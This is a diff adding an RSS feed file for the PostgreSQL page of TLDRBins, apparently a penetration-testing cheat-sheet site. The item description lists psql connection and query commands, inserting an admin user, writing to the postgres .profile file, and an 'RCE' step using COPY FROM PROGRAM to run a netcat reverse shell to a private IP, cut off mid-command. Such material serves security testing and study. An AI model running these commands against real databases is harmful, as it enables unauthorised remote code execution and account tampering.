@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Postgresql on TLDRBins</title>
+    <link>https://tldrbins.github.io/@postgresql/</link>
+    <description>Recent content in Postgresql on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@postgresql/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Postgresql</title>
+      <link>https://tldrbins.github.io/postgresql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/postgresql/</guid>
+      <description>General Connect to postgresql Database psql -h 127.0.0.1 -U &amp;lt;USER&amp;gt; -p 5432 -d &amp;lt;DB_NAME&amp;gt; psql postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5432/&amp;lt;DB_NAME&amp;gt; Basic Commands # Show databases \list # Use database \connect &amp;lt;DB_NAME&amp;gt; # Show tables in current database \dt # Dump data from table select * from &amp;lt;TABLE_NAME&amp;gt;; # Insert data into table (e.g) insert into &amp;lt;TABLE_NAME&amp;gt; (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Write text copy (select &amp;#39;test&amp;#39;) to &amp;#39;/var/lib/postgresql/.profile&amp;#39;; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash 10.</description>
+    </item>
+  </channel>
+</rss>
